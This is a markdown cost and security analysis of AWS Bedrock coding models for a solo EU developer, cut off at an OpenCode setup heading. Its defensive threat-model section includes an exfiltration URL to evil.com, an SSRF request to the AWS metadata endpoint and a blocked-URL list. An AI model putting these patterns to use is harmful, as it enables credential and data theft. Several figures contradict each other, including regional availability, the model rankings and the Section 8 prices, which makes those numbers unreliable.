# AWS State-of-the-Art Coding Model — Cost & Security Analysis

**Profile:** Solo Developer  
**Region:** eu-west-2 (London) — primary; us-east-1 (N. Virginia) for reference  
**Currency:** EUR (conversion rate: 1 USD = 0.92 EUR, April 2026)  
**VAT:** All EUR prices include 20% VAT (consumer/no VAT ID). Business with EU VAT ID: apply reverse charge (divide by 1.20 for ex-VAT).  
**Date:** 2026-04-01  
**Stack:** Amazon Bedrock + Tailscale VPN

> **Important:** **eu-west-2 (London)** has the most coding models (60) of any EU region and is the recommended choice. eu-west-3 (Paris) has only 32 models (no coding-specific ones). eu-west-2 (London) has 59 models but lacks Kimi K2.5, Qwen3 Coder 480B, and DeepSeek. EU regions carry a ~20% price premium over us-east-1. DeepSeek R1 and Llama 4 are NOT available in any EU region.

---

## 1. Model Pricing & Benchmark Quality (On-Demand, per 1K tokens)

Data sources: AWS Pricing API (2026-03-26), [Onyx Open LLM Leaderboard](https://onyx.app/open-llm-leaderboard) (2026-04-01).

### eu-west-2 (London) — EUR pricing (incl. 20% VAT)

| Model | Provider | Params | Input (€) | Output (€) | SWE-bench | HumanEval | LiveCodeBench | GPQA | Arena |
|---|---|---|---|---|---|---|---|---|---|
| Qwen3 Coder 30B | Qwen | 30B | €0.000199 | €0.000773 | N/A | N/A | N/A | N/A | N/A |
| Qwen3 Coder 480B | Qwen | 480B | €0.000596 | €0.002384 | N/A* | N/A* | N/A* | N/A* | N/A* |
| Qwen3 Coder Next | Qwen | N/A | €0.000662 | €0.001590 | N/A | N/A | N/A | N/A | N/A |
| Mistral Large 3 | Mistral | 675B | €0.000662 | €0.001987 | N/A | 92.0 | 82.8 | 43.9 | 1416 |
| DeepSeek V3.1 | DeepSeek | 685B | €0.000768 | €0.002226 | 67.8** | N/A | 74.1** | 79.9** | 1423** |
| Kimi K2.5 | Moonshot | 1T | €0.000794 | €0.003312 | 76.8*** | 99.0*** | 85.0*** | 87.6*** | 1438*** |

**Not available in EU regions:**

| Model | Provider | us-east-1 Input ($) | us-east-1 Output ($) | SWE-bench | HumanEval | LiveCodeBench |
|---|---|---|---|---|---|---|
| Llama 4 Scout 17B | Meta | $0.00017 | $0.00066 | N/A | N/A | N/A |
| Llama 4 Maverick 17B | Meta | $0.00024 | $0.00097 | N/A | 62.0 | 43.4 |
| DeepSeek R1 | DeepSeek | $0.00135 | $0.00540 | 49.2 | 90.2 | 65.9 |

### us-east-1 (N. Virginia) — USD reference pricing

| Model | Input ($) | Output ($) | EU Premium |
|---|---|---|---|
| Qwen3 Coder 30B | $0.00015 | $0.00060 | +20% |
| Qwen3 Coder 480B | $0.00045 | $0.00180 | +20% |
| Mistral Large 3 | $0.00050 | $0.00150 | +20% |
| DeepSeek V3.1 | $0.00058 | $0.00168 | +20% |
| Kimi K2.5 | $0.00060 | $0.00250 | +20% |
| DeepSeek R1 | $0.00135 | $0.00540 | N/A (EU unavailable) |

\* Qwen3 Coder 480B is a code-specialized variant of Qwen3; general benchmarks available for Qwen 3 235B (SWE-bench N/A, LiveCodeBench 74.1, GPQA 81.1, Arena 1423) and Qwen 3.5 397B (SWE-bench 76.4, LiveCodeBench 83.6, GPQA 88.4, Arena 1450).  
\*\* Leaderboard shows DeepSeek V3.2 (685B) — V3.1 on Bedrock is the prior version; scores may be slightly lower.  
\*\*\* Leaderboard shows Kimi K2.5 — Bedrock offers K2 Thinking; K2.5 scores shown as upper bound.

Flex/batch tiers offer ~50% discount on most models. Qwen3 Coder Next is available in eu-west-2 but not us-east-1.

### Coding Benchmark Key

| Benchmark | What It Measures | Scale |
|---|---|---|
| **SWE-bench** | Real-world GitHub issue resolution (end-to-end) | % resolved (higher = better) |
| **HumanEval** | Function-level code generation from docstrings | % pass@1 (higher = better) |
| **LiveCodeBench** | Competitive programming problems (contamination-free) | % solved (higher = better) |
| **GPQA Diamond** | Graduate-level science/reasoning questions | % correct (higher = better) |
| **Chatbot Arena** | Human preference rating (ELO-style) | ELO score (higher = better) |

---

## 2. Usage Scenarios (Solo Developer)

| Scenario | Requests/day | Avg Input Tokens | Avg Output Tokens | Monthly Tokens (in/out) |
|---|---|---|---|---|
| Light (occasional assist) | 30 | 1,500 | 3,000 | 1.35M / 2.7M |
| Medium (daily coding partner) | 80 | 2,000 | 4,000 | 4.8M / 9.6M |
| Heavy (pair programming all day) | 200 | 3,000 | 5,000 | 18M / 30M |

---

## 3. Monthly Inference Cost by Model — eu-west-2 in EUR incl. 20% VAT (ranked by coding quality)

Models ordered by coding benchmark composite (avg of SWE-bench, HumanEval, LiveCodeBench where available).

| Rank | Model | Coding Composite | Light | Medium | Heavy |
|---|---|---|---|---|---|
| 1 | Kimi K2.5 | 86.9 (SWE 76.8, HE 99.0, LCB 85.0) | €10.02 | €35.62 | €113.66 |
| 2 | Mistral Large 3 | 87.4 (HE 92.0, LCB 82.8) | €6.26 | €22.26 | €71.54 |
| 3 | DeepSeek V3.1 | 70.9 (SWE 67.8, LCB 74.1)** | €7.04 | €25.06 | €80.60 |
| 4 | Qwen3 Coder 480B | ~77* (est. from Qwen 3.5 family) | €7.25 | €25.75 | €82.27 |
| 5 | Qwen3 Coder Next | N/A (new model, no benchmarks yet) | €5.18 | €18.44 | €59.63 |
| 6 | Qwen3 Coder 30B | N/A (no benchmarks) | €2.35 | €8.38 | €26.77 |

**Not available in eu-west-2 (us-east-1 only, in USD + VAT where applicable):**

| Rank | Model | Coding Composite | Light | Medium | Heavy |
|---|---|---|---|---|---|
| — | DeepSeek R1 | 68.4 (SWE 49.2, HE 90.2, LCB 65.9) | $16.40 | $52.62 | $164.70 |
| — | Llama 4 Maverick | 52.7 (HE 62.0, LCB 43.4) | $2.95 | $9.47 | $29.34 |

\* Qwen3 Coder 480B estimated from Qwen 3.5 (SWE 76.4, LCB 83.6) — code-specialized variant likely scores higher.  
\*\* V3.2 scores shown; V3.1 on Bedrock may score slightly lower.

---

## 4. Fixed Infrastructure Costs (monthly, eu-west-2, incl. 20% VAT)

| Component | Cost (EUR incl. VAT) | Notes |
|---|---|---|
| Tailscale Personal | €0 | Free for 1 user, 100 devices |
| EC2 t3.micro (Tailscale subnet router) | €10.49 | eu-west-2 pricing; or use own machine = €0 |
| Lambda (orchestration) | €1.20-3.60 | Free tier covers most solo dev usage |
| API Gateway | €1.20-2.40 | Minimal at solo dev volume |
| CloudWatch | €3.60 | Basic logging |
| VPC Endpoint for Bedrock (optional) | €9.28 | Keeps traffic off public internet |
| **Total (minimal)** | **~€6** | Tailscale on own machine, Lambda free tier |
| **Total (recommended)** | **~€28** | With VPC endpoint and EC2 subnet router |

---

## 5. Total Monthly Cost & Value Efficiency (all-in, eu-west-2 in EUR incl. 20% VAT)

Using ~€6/mo minimal fixed infra (incl. VAT). Models ranked by **value score** (coding quality per euro).

| Model | Coding Quality | Medium Cost | Value Score | Tier |
|---|---|---|---|---|
| Mistral Large 3 | 87.4 | ~€28 | 3.12 | BEST VALUE |
| Qwen3 Coder 480B | ~77* | ~€32 | 2.41 | BEST VALUE |
| Kimi K2.5 | 86.9 | ~€42 | 2.07 | HIGH QUALITY |
| DeepSeek V3.1 | 70.9 | ~€31 | 2.29 | GOOD VALUE |
| Qwen3 Coder Next | N/A | ~€24 | N/A | NEW — WATCH |
| Qwen3 Coder 30B | N/A | ~€14 | N/A | CHEAPEST |

Value Score = Coding Composite / Monthly Cost (medium use). Higher = better bang for buck.

### Total Monthly Cost (all-in, with €6 minimal infra incl. VAT, eu-west-2)

| Model | Light | Medium | Heavy |
|---|---|---|---|
| Qwen3 Coder 30B | ~€8 | ~€14 | ~€33 |
| Qwen3 Coder Next | ~€11 | ~€24 | ~€66 |
| Mistral Large 3 | ~€12 | ~€28 | ~€78 |
| Qwen3 Coder 480B | ~€13 | ~€32 | ~€88 |
| DeepSeek V3.1 | ~€13 | ~€31 | ~€87 |
| Kimi K2.5 | ~€16 | ~€42 | ~€120 |

### Key Insights from Leaderboard Correlation

1. **DeepSeek R1 is NOT available in EU regions**, and it's not the best coding model anyway. It excels at math/reasoning (AIME 87.5%, MATH 97.3%) but its SWE-bench (49.2%) is mediocre. If you need it, you must use us-east-1.

2. **Mistral Large 3 is the best value for coding in EU.** HumanEval 92.0% and LiveCodeBench 82.8% at only ~€28/mo medium use (incl. VAT). Its weak GPQA (43.9%) doesn't matter for coding workflows.

3. **Kimi K2.5 is the overall coding champion** on Bedrock with the highest composite (SWE-bench 76.8%, HumanEval 99.0%, LiveCodeBench 85.0%), but at ~€42/mo it costs 50% more than Mistral Large 3.

4. **Qwen3 Coder 480B is likely underrated.** As a code-specialized model derived from the Qwen 3.5 family (SWE-bench 76.4%, LiveCodeBench 83.6%, Arena 1450), it may match or exceed Kimi K2 on coding tasks at lower cost. No standalone benchmarks yet.

5. **Qwen3 Coder Next is a new EU-available model** at a competitive price point (~€24/mo medium incl. VAT). No benchmark data yet — worth monitoring.

6. **Llama 4 Maverick is weak for coding** (HumanEval 62.0%, LiveCodeBench 43.4%) and unavailable in EU. Not recommended.

7. **EU premium is a flat 20%** across all models vs us-east-1. For data residency or latency reasons, this is a reasonable trade-off.

### Recommended Strategy (Solo Developer, EU-based)

| Use Case | Model | Why | Monthly Cost (EUR incl. VAT) |
|---|---|---|---|
| Daily coding (primary) | **Mistral Large 3** | Best value: HE 92%, LCB 82.8% | ~€28 |
| Complex refactoring / bug hunting | **Kimi K2.5** | Highest coding scores across all benchmarks | ~€42 |
| Quick completions / boilerplate | **Qwen3 Coder 30B** | Cheapest, fast, good enough for simple tasks | ~€14 |
| Math/algorithm problems | **DeepSeek R1** (us-east-1) | AIME 87.5%, MATH 97.3% — cross-region, use sparingly | Pay-per-use (USD) |

**Estimated monthly cost with multi-model strategy:** ~€29-36/mo incl. VAT (Mistral primary + Qwen3 30B for simple tasks, Kimi on-demand for hard problems).

---

## 5b. Power User Analysis & Claude Comparison

### What Does Each Usage Level Look Like in Practice?

| Level | Req/day | Per hour (8h day) | Real-world behavior |
|---|---|---|---|
| **Light** (30/day) | ~4/hour | "I ask AI when I'm stuck" | Occasional help with syntax, errors, quick lookups |
| **Medium** (80/day) | ~10/hour | "AI is my coding partner" | Active use for key tasks — generation, reviews, tests |
| **Heavy** (200/day) | ~25/hour | "I don't write a line without AI" | Constant pair programming, every function AI-assisted |
| **Power** (400/day) | ~50/hour | "AI writes, I review and steer" | Full AI-driven development, large refactors, multi-file work |
| **Extreme** (800+/day) | ~100/hour | "Automated agents + human oversight" | CI/CD agents, batch processing, parallel coding agents |

### Heavy User Breakdown (200 req/day)

| Activity | Requests | Typical Tokens (in/out) | Daily Output |
|---|---|---|---|
| Code generation ("write a function that...") | 40-50 | 2K / 6K | ~400K |
| Code review / explain ("what does this do?") | 20-30 | 4K / 3K | ~90K |
| Debugging ("why is this failing?") | 30-40 | 5K / 4K | ~160K |
| Refactoring ("make this cleaner") | 20-30 | 4K / 5K | ~150K |
| Test generation ("write tests for...") | 20-30 | 3K / 8K | ~240K |
| Chat / Q&A ("how do I X in Python?") | 30-40 | 1K / 2K | ~80K |
| **Total** | **~200** | **avg 3K / 5K** | **~1.1M/day** |

A power user (400/day) doubles the above. An extreme user runs automated pipelines that multiply it further.

### Claude Plans Pricing (April 2026, incl. 20% VAT)

| Plan | Price (USD ex-VAT) | Price (EUR incl. VAT) | Usage Limits | Messages (est.) |
|---|---|---|---|---|
| **Claude Pro** | $20/mo | ~€22 | Baseline | ~40-45 per 5h window (~120-160/day) |
| **Claude Max 5x** | $100/mo | ~€110 | 5x Pro | ~225 per 5h window (~450/day) |
| **Claude Max 20x** | $200/mo | ~€221 | 20x Pro | ~900 per 5h window (~1800/day) |

**Claude limitations:**
- Limits are **dynamic** — reduced during peak hours (5am-11am PT weekdays)
- Shared between Claude chat and Claude Code
- Longer conversations and larger codebases consume more tokens per message
- Anthropic-only models (Claude Sonnet/Opus) — no model choice flexibility
- No data residency guarantee for EU
- **VAT is charged on top** for EU consumers without a VAT ID

### Bedrock Cost at Claude-Equivalent Usage Levels (eu-west-2, EUR)

#### Single-model strategy (incl. 20% VAT)

| Model | Heavy (~Pro) | Power (~Max 5x) | Extreme (~Max 20x) |
|---|---|---|---|
| | 200 req/day | 400 req/day | 800 req/day |
| Qwen3 Coder 30B | €33 | €59 | €112 |
| Qwen3 Coder Next | €66 | €125 | €245 |
| Mistral Large 3 | €78 | €149 | €292 |
| Qwen3 Coder 480B | €88 | €170 | €335 |
| DeepSeek V3.1 | €87 | €167 | €328 |
| Kimi K2.5 | €120 | €233 | €461 |

Includes ~€6 minimal infra (incl. VAT).

#### Multi-model strategy (recommended for power users, incl. 20% VAT)

Split traffic: 60% Qwen3 Coder 30B (simple) + 30% Mistral Large 3 (quality) + 10% Kimi K2 (hard problems).

| Tier | Daily Requests | Monthly Cost (EUR incl. VAT) |
|---|---|---|
| Heavy (~Pro equivalent) | 200/day | ~€62 |
| Power (~Max 5x equivalent) | 400/day | ~€110 |
| Extreme (~Max 20x equivalent) | 800/day | ~€214 |

Includes ~€6 minimal infra (incl. VAT).

### Head-to-Head Comparison (all prices EUR incl. 20% VAT)

| | Claude Pro | Claude Max 5x | Claude Max 20x | Bedrock Multi-Model |
|---|---|---|---|---|
| **Monthly cost** | ~€22 | ~€110 | ~€221 | €29-214 (scales with use) |
| **Equivalent Bedrock cost** | €29-62 | €110 | €214 | — |
| **Model choice** | Claude only | Claude only | Claude only | 6+ models, swap anytime |
| **Throttling** | Peak hours limited | Peak hours limited | Rare | Never (pay-per-use) |
| **Hard cap** | Yes (window resets) | Yes (window resets) | Yes (window resets) | No — unlimited |
| **Cost at low usage** | €22 (flat) | €110 (flat) | €221 (flat) | €8-14 (pay only what you use) |
| **EU data residency** | No | No | No | Yes (eu-west-2) |
| **Open source client** | No | No | No | Yes (OpenCode) |
| **Coding quality** | Excellent (Opus/Sonnet) | Excellent | Excellent | Varies by model (see benchmarks) |
| **Agentic capabilities** | Best-in-class | Best-in-class | Best-in-class | Good (OpenCode + MCP) |

### When Each Option Wins

| Scenario | Winner | Why |
|---|---|---|
| Light-to-medium solo dev (€22-36 budget) | **Claude Pro** | Flat rate, excellent quality, no setup |
| Medium dev who needs EU data residency | **Bedrock** | Only option with guaranteed EU hosting |
| Heavy dev who hates throttling | **Bedrock** | No caps, no peak-hour limits |
| Power user, budget-conscious | **Bedrock multi-model** | €110 matches Max 5x but with no caps |
| Power user, quality-first | **Claude Max 5x** | Opus/Sonnet agentic quality is unmatched |
| Extreme / automated pipelines | **Bedrock** | Claude caps make automation unreliable |
| Dev who needs model diversity | **Bedrock + OpenCode** | 6+ models, local fallback via Ollama |
| Dev who wants zero setup | **Claude Pro/Max** | Works out of the box, no infra to manage |

### Break-Even Analysis (all EUR incl. 20% VAT)

| If you use... | Claude costs | Bedrock costs (multi-model) | Verdict |
|---|---|---|---|
| < 80 req/day | €22 (Pro) | €14-29 | **Roughly equal** — Claude Pro simpler |
| 80-200 req/day | €22 (Pro, may throttle) | €29-62 | **Bedrock wins** if you hit Claude limits |
| 200-450 req/day | €110 (Max 5x) | €62-110 | **Bedrock wins** on cost |
| 450-900 req/day | €221 (Max 20x) | €110-214 | **Bedrock wins** on cost |
| 900+ req/day | €221 (Max 20x, capped) | €214+ (uncapped) | **Bedrock wins** — Claude can't serve this |

**The crossover point:** Bedrock becomes cheaper than Claude Max 5x at ~200 requests/day with multi-model routing. Below ~80 req/day, Claude Pro is simpler and roughly the same cost.

---

## 5c. Model Mix Scenarios — Heavy & Power Users (eu-west-2, EUR)

The key advantage of Bedrock over Claude subscriptions is **routing each request to the right model**. Not every coding task needs a premium reasoning model — most don't.

### Model Tiers

| Tier | Model | Coding Quality | Cost at 100% Heavy (200 req/day) incl. VAT | Best For |
|---|---|---|---|---|
| **Budget** | Qwen3 Coder 30B | N/A (fast, lightweight) | €27/mo | Boilerplate, completions, docstrings, commit messages, quick Q&A |
| **Mid** | Qwen3 Coder 480B | ~77 (est. from Qwen 3.5 family) | €88/mo | Code generation, refactoring, code review, test writing |
| **Mid-alt** | Qwen3 Coder Next | N/A (new, promising) | €60/mo | Same as Mid, cheaper, unproven benchmarks |
| **Premium** | Kimi K2.5 | 86.9 (SWE 77%, HE 99%, LCB 85%) | €114/mo | Complex debugging, architecture, multi-file refactors, security review |

### Mix Definitions

| Mix | Budget (Qwen3 30B) | Mid (Qwen3 480B) | Premium (Kimi K2.5) | Description |
|---|---|---|---|---|
| **A — Mostly budget** | 80% | 15% | 5% | AI for boilerplate, premium only for hard bugs |
| **B — Balanced** | 60% | 30% | 10% | Daily partner with quality escalation |
| **C — Quality-leaning** | 40% | 40% | 20% | Most real work on quality models |
| **D — Premium-heavy** | 20% | 40% | 40% | Quality-first, budget only for trivial tasks |
| **E — All premium** | 0% | 30% | 70% | Maximum quality, no compromises |

### Monthly Cost by Mix (Qwen3 480B as Mid-tier, incl. 20% VAT)

Includes ~€6 minimal infra (incl. VAT).

| Mix | Heavy (200/day) | Power (400/day) | Extreme (800/day) | vs Claude (incl. VAT) |
|---|---|---|---|---|
| **A — Mostly budget** | **€44** | €82 | €157 | Cheaper than Max 5x (€110) up to Power |
| **B — Balanced** | **€55** | €104 | €202 | Half the cost of Max 5x (€110) at Heavy |
| **C — Quality-leaning** | **€68** | €130 | €254 | Under Max 5x (€110) at Heavy |
| **D — Premium-heavy** | **€85** | €164 | €324 | Under Max 5x at Heavy, under Max 20x (€221) at Power |
| **E — All premium** | **€107** | €208 | €410 | Matches Max 5x at Heavy, under Max 20x at Power |

### Monthly Cost by Mix (Qwen3 Coder Next as Mid-tier — 17% cheaper, incl. 20% VAT)

| Mix | Heavy (200/day) | Power (400/day) | Extreme (800/day) |
|---|---|---|---|
| **A — Mostly budget** | **€41** | €76 | €146 |
| **B — Balanced** | **€49** | €93 | €180 |
| **C — Quality-leaning** | **€60** | €114 | €223 |
| **D — Premium-heavy** | **€77** | €147 | €289 |
| **E — All premium** | **€98** | €191 | €376 |

### Routing Guide — What Goes Where

| Task | Tier | Why | % of typical day |
|---|---|---|---|
| Autocomplete / boilerplate | Budget | Speed > quality, trivial output | 15-20% |
| Docstrings / comments | Budget | Template-driven, any model handles this | 5-10% |
| Commit messages | Budget | Short output, low complexity | 5% |
| "How do I X?" questions | Budget | Simple retrieval, no deep reasoning | 10-15% |
| Code generation (new functions) | Mid | Needs correctness, type awareness | 15-20% |
| Code review / explain | Mid | Needs understanding of patterns | 10% |
| Test generation | Mid | Needs coverage awareness, edge cases | 10-15% |
| Refactoring | Mid / Premium | Mid for simple, Premium for architectural | 10% |
| Complex debugging | Premium | Needs deep reasoning, multi-file context | 5-10% |
| Architecture / design decisions | Premium | Highest reasoning quality needed | 2-5% |
| Security review | Premium | Must not miss vulnerabilities | 2-5% |

A typical developer's natural distribution lands around **Mix B-C** (balanced to quality-leaning).

### Visual Cost Comparison (Heavy User, 200 req/day, incl. VAT)

```
€0        €25       €50       €75       €100      €125      €150      €175      €200      €225
|---------|---------|---------|---------|---------|---------|---------|---------|---------|
                                                                          
Mix A ██████████████████░ €44
Mix B ██████████████████████░ €55
Mix C ████████████████████████████░ €68
Mix D ██████████████████████████████████░ €85
Mix E ████████████████████████████████████████████░ €107
                                                                          
Claude Pro █████████░ €22 (but throttles at this usage)
Claude Max 5x ████████████████████████████████████████████████░ €110
Claude Max 20x ████████████████████████████████████████████████████████████████████████████████████████████░ €221
```

### Recommended Mix by Budget (incl. VAT)

| Monthly Budget | Recommended Mix | What You Get |
|---|---|---|
| **€35-50** | Mix A (80/15/5) | AI for everything, quality when it matters |
| **€50-70** | Mix B (60/30/10) | Strong daily partner, good quality balance |
| **€65-90** | Mix C (40/40/20) | Quality-focused, budget only for trivial tasks |
| **€85-120** | Mix D (20/40/40) | Near-premium experience at ~77% of Claude Max 5x |
| **€107+** | Mix E (0/30/70) | Maximum quality, comparable to Claude Max 5x |

### Key Insight

> **Mix B (balanced) at €55/mo delivers 80-90% of the coding quality of an all-premium setup at half the cost.** The Budget tier handles 60% of requests perfectly fine — completions, boilerplate, Q&A — while the premium tier is reserved for the 10% of tasks where reasoning quality actually impacts the outcome.

> Compared to Claude Max 5x (€110/mo incl. VAT), Mix B saves ~€55/mo with **no throttling, no caps, EU data residency, and model flexibility**. The trade-off is that Claude's agentic capabilities (Opus/Sonnet) are still superior for complex multi-step coding tasks.

---

## 5d. Automatic Model Routing — Open Source Solutions

Automatic routing between cheap and expensive models is a solved problem with several open-source projects available.

### Ready-Made Solutions

| Project | Stars | Approach | Bedrock Support | Best For |
|---|---|---|---|---|
| [NadirClaw](https://github.com/NadirRouter/NadirClaw) | ~377 | 3-tier sentence-embedding classifier (~10ms), drop-in proxy | Via LiteLLM | **Drop-in proxy for OpenCode/Cursor/Claude Code** |
| [RouteLLM](https://github.com/lm-sys/RouteLLM) | ~4.7K | Strong/weak routing with pre-trained classifiers (BERT, MF) | Via LiteLLM | **Best classifier accuracy (LMSYS/Chatbot Arena team)** |
| [LLMRouter](https://github.com/ulab-uiuc/LLMRouter) | ~1.6K | 16+ routing models (KNN, SVM, MLP, BERT), unified CLI | No | Research and evaluation |
| [Bifrost](https://github.com/maximhq/bifrost) | ~3.4K | High-perf Go gateway, <100us overhead, 5K RPS | Native | Gateway/failover layer |
| [UncommonRoute](https://github.com/CommonstackAI/UncommonRoute) | ~182 | Simple cost/quality balancer, 90-95% cost reduction | No | Lightweight reference |
| [LiteLLM](https://github.com/BerriAI/litellm) | ~41.8K | Unified proxy, 100+ providers, cost tracking, rate limiting | Native | **Base gateway layer** |

### Routing Strategy Comparison

| Strategy | How It Works | Accuracy | Latency | Extra Cost |
|---|---|---|---|---|
| **Sentence-embedding classifier** (NadirClaw) | Embeds the prompt, classifies complexity | ~85-90% | ~10ms | none (runs locally) |
| **Pre-trained BERT classifier** (RouteLLM) | Fine-tuned on Chatbot Arena data | ~90-95% | ~20ms | none (runs locally) |
| **Two-pass confidence self-assessment** (custom) | Budget model rates its own confidence | ~85% | Full budget response time | ~0.20/mo |
| **Keyword/pattern matching** (custom) | Regex on prompt content | ~70% | <1ms | none |
| **Small model classifier** (custom) | Budget model classifies before routing | ~85-90% | ~200ms | ~0.20/mo |

### Recommended Architecture

```
OpenCode --> NadirClaw or custom proxy (localhost:4000) --> LiteLLM --> Bedrock (eu-west-2)
                     |                                          |
              Sentence-embedding                         AWS SDK + VPC endpoint
              classifier (~10ms)                         via Tailscale tunnel
                     |
              +------+------+
              v      v      v
           Budget   Mid   Premium
         (Qwen 30B)(Qwen 480B)(Kimi K2.5)
```

**Option A -- Use NadirClaw directly (CHOSEN):** Install NadirClaw, configure three Bedrock models via LiteLLM, point OpenCode to it. Fastest path to production. Includes cost tracking, budget alerts, fallback chains, and a live dashboard. See `SETUP_GUIDE.md` for the complete recipe.

**Option B -- Custom proxy with RouteLLM classifier:** Build a FastAPI proxy that uses RouteLLM's pre-trained classifier for routing decisions and LiteLLM for Bedrock calls. More control, includes security middleware and two-pass fallback.

**Option C -- Custom two-pass router:** Full custom implementation with confidence self-assessment, pattern-based force routing, security middleware, and cost tracking. Most control, most maintenance.

---

## 6. Security Analysis — Model Isolation

### 6.1 How Bedrock Works

Amazon Bedrock is a **managed API** — you are NOT downloading models. Your prompts are sent to AWS-hosted inference infrastructure and responses are returned. Key guarantees:

- AWS **does not use your data to train models**
- Inputs/outputs are **not stored** beyond the request lifecycle
- Data is **encrypted in transit** (TLS) and **at rest**
- With a **VPC endpoint**, traffic never leaves the AWS backbone
- Third-party model providers (DeepSeek, Qwen, Moonshot, etc.) **do NOT receive your requests** — AWS hosts a copy of the model weights on its own infrastructure

### 6.2 Threat Model (Inference Only, No Tools)

| Threat | Risk Level | Mitigation |
|---|---|---|
| AWS operator sees your data in memory | Low | Contractual/compliance protections (SOC2, HIPAA BAA) |
| Data exfiltration via model | None | Model cannot initiate network connections |
| Model training on your data | None | AWS explicitly opts out in Bedrock |
| Man-in-the-middle | Very Low | TLS + Tailscale tunnel + VPC endpoint |
| Prompt injection leaking context | Medium | Never put secrets/credentials in prompts |
| Logs containing sensitive data | Medium | Disable CloudWatch prompt logging or encrypt |
| Data sent to model provider (DeepSeek/Qwen) | None | AWS hosts weights locally; providers have no access |

### 6.3 Isolation Levels Compared

| Approach | Isolation | Monthly Cost |
|---|---|---|
| Bedrock API + VPC endpoint | High (trust AWS) | $10-60 |
| SageMaker dedicated endpoint | Higher (dedicated GPU) | $500-2,000+ |
| EC2 self-hosted (vLLM/Ollama) | Highest (full control) | $700-3,000+ |
| Local machine (Ollama) | Complete (air-gap possible) | $0 infra, requires beefy GPU |

Self-hosting a 480B model requires multiple A100/H100 GPUs — not practical for a solo dev.

---

## 7. Security Analysis — When the Model Uses Tools (Internet Access)

### 7.1 The Problem

Once the model is given tools that reach the internet, isolation breaks down:

```
Without tools:  [Your Code] --> [Model] --> [Response]           (isolated)
With tools:     [Your Code] --> [Model] --> [Internet] --> [???] (NOT isolated)
```

The model itself cannot access the internet. But tool use / function calling allows it to **instruct your application** to do so on its behalf.

### 7.2 Threat Surface by Capability

#### Web Search

| Threat | Risk | Description |
|---|---|---|
| Query leaks your context | HIGH | Model sends search queries containing fragments of your code/data |
| Search results inject prompts | MEDIUM | Malicious websites embed prompt injection in HTML/snippets |
| Search provider logs your queries | HIGH | Google/Bing records what you're working on |

**Example attack:** You ask "fix this auth bug in my login handler" — the model searches for "fix JWT validation bypass in MyCompanyApp login endpoint" — now the search provider knows your app name and that you have an auth vulnerability.

#### File Download

| Threat | Risk | Description |
|---|---|---|
| Downloading malicious content | HIGH | Model fetches a URL serving malware or backdoored code |
| SSRF (Server-Side Request Forgery) | CRITICAL | Model requests `http://169.254.169.254/latest/meta-data/` — leaks AWS credentials |
| Exfiltration via URL params | HIGH | Model crafts `https://evil.com/log?data=YOUR_SECRET` disguised as a download |

#### File Upload

| Threat | Risk | Description |
|---|---|---|
| Data exfiltration | CRITICAL | Model uploads your source code to an external service |
| Credential theft | CRITICAL | Model uploads `.env`, SSH keys, or AWS credentials |
| Supply chain poisoning | MEDIUM | Model pushes compromised packages to registries |

### 7.3 Mitigation Architecture

```
+---------------------------------------------------+
|  YOUR MACHINE (Tailscale)                         |
|                                                   |
|  +---------+    +----------+    +--------------+  |
|  | Your App |--->| Tool     |--->| Proxy /      |--+--> Internet
|  |         |    | Router   |    | Allowlist    |  |
|  +---------+    +----------+    +--------------+  |
|       |                                           |
|       v         VPC Endpoint (private)            |
|  +---------+                                      |
|  | Bedrock |  (no internet access)                |
|  +---------+                                      |
+---------------------------------------------------+
```

### 7.4 Required Safeguards

#### Layer 1: Tool Allowlisting

Never give the model raw HTTP/curl access. Define constrained tools:

| Instead of | Use |
|---|---|
| Raw URL fetch | Search tool querying a specific API (e.g., Brave Search) |
| Arbitrary file download | Tool that only downloads from allowlisted domains |
| File upload | Tool that only writes to local filesystem or specific S3 bucket |

#### Layer 2: Domain Allowlist

```
ALLOWED_SEARCH_DOMAINS:
  - docs.python.org
  - stackoverflow.com
  - developer.mozilla.org
  - docs.aws.amazon.com

BLOCKED_URLS:
  - 169.254.169.254/*          # AWS metadata (SSRF)
  - 127.0.0.1 / localhost      # Local services
  - *.internal                  # Internal DNS
```

#### Layer 3: Content Filtering

Before passing downloaded content back to the model:

- Strip HTML, keep only text
- Scan for prompt injection patterns
- Limit response size (prevent context poisoning)
- Never pass raw binary files to the model

#### Layer 4: Upload Controls

- No outbound uploads unless to your own S3 bucket
- All "uploads" should be local file writes that you manually review
- Never let the model compose and send HTTP POST/PUT to external URLs

### 7.5 Recommended Tool-Enabled Architecture

| Component | Cost/mo | Purpose |
|---|---|---|
| Bedrock (model) | $10-60 | Inference only, no internet access |
| Lambda (tool executor) | $2-5 | Runs tools in sandboxed environment |
| S3 bucket (file storage) | $1 | Model reads/writes files here, not internet |
| Brave Search API | $0 | Free tier: 2,000 queries/mo, privacy-focused |
| API Gateway + WAF | $5-10 | Rate limiting, URL filtering |
| Tailscale | $0 | Secure access to your infrastructure |
| **Total** | **$20-80** | |

---

## 8. Recommendations

### Model Choice

- **Daily driver:** Qwen3 Coder 480B — best quality/cost ratio at $10-22/mo
- **Budget option:** Qwen3 Coder 30B — solid results at $7-12/mo
- **Hard problems only:** DeepSeek R1 — reserve for complex debugging/architecture

### Security Posture

1. **Enable VPC endpoint for Bedrock** (+$7.50/mo) — keeps traffic off public internet
2. **Disable prompt/response logging** in CloudWatch if code is sensitive
3. **Never put secrets, API keys, or credentials in prompts**
4. **Tailscale ACLs** — restrict which devices can reach your API
5. **Human-in-the-loop** — require your approval for any action that sends data externally
6. **SSRF protection** — Lambda runs in a VPC with no access to the metadata endpoint
7. **Review AWS Data Processing Addendum** for your jurisdiction (GDPR, etc.)

### Golden Rule

> **The model decides what to do, but your code decides what's allowed.** Never give the model raw network access.

---

## 9. OpenCode Integration

### 9.1 What Is OpenCode?

[OpenCode](https://opencode.ai/) is an **open-source AI coding agent** (120K+ GitHub stars, 5M+ monthly developers) built in Go. It provides a rich TUI (Terminal User Interface) with vim-like editing, session persistence (SQLite), and multi-provider LLM support.

Available as: **CLI/TUI tool**, **desktop app**, and **IDE extension** (VS Code compatible).

GitHub: [github.com/opencode-ai/opencode](https://github.com/opencode-ai/opencode)

### 9.2 Why OpenCode + AWS Bedrock?

| Advantage | Description |
|---|---|
| **Free client** | OpenCode is free — you only pay for API usage |
| **Bedrock native support** | First-class provider, uses standard AWS credential chain |
| **Provider flexibility** | 75+ providers — can mix Bedrock models with local Ollama models |
| **Privacy** | Can run fully local with Ollama for sensitive code, Bedrock for complex tasks |
| **MCP support** | Extensible via Model Context Protocol servers |
| **Open source** | Full audit trail of what the tool does with your code |

### 9.3 Bedrock Configuration

OpenCode authenticates with Bedrock via the standard AWS credential chain:

